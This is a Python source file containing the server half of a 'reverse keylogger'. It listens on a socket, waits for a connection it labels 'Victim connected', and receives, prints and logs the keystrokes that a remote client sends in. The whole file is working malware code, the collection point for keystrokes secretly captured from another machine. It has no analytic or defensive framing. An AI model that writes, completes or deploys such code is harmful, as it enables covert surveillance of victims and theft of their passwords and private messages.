import socket


class ServerMode:
    """
    Class for server mode operation - receives and logs keystrokes from connected clients
    Listens for incoming connections and captures keyboard input
    """
    
    def __init__(self, config):
        self.config = config
    
    def start_server(self):
        """
        Start the server and listen for incoming connections
        Continuously receives and processes keystroke data from clients
        """
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.config.host, self.config.port))
        server.listen()
        
        print(f"Listening in port : {self.config.port}")
        client, addr = server.accept()
        
        print(f"Victim connected ! {addr}")
        print("reverse keylogger started !")
        
        if self.config.enable_output_file:
            print(f"Keylogger has been saved to {self.config.file_path}")
        
        try:
            # Main loop to receive and process keystrokes
            while True:
                try:
                    data = client.recv(1024)
                    if not data:
                        break
                    
                    decoded_data = data.decode()
                    print(decoded_data)
                    
                    # Write to file if file output is enabled
                    if self.config.enable_output_file and self.config.keylogger_file:
                        self.config.keylogger_file.write(f"{decoded_data}\n")
                        self.config.keylogger_file.flush()
                        
                except Exception as err:
                    print(err)
                    break
                    
        finally:
            # Cleanup resources - ensure proper closure of connections and files
            server.close()
            if self.config.enable_output_file and self.config.keylogger_file and not self.config.keylogger_file.closed:
                self.config.keylogger_file.close()
            if client:
                client.close()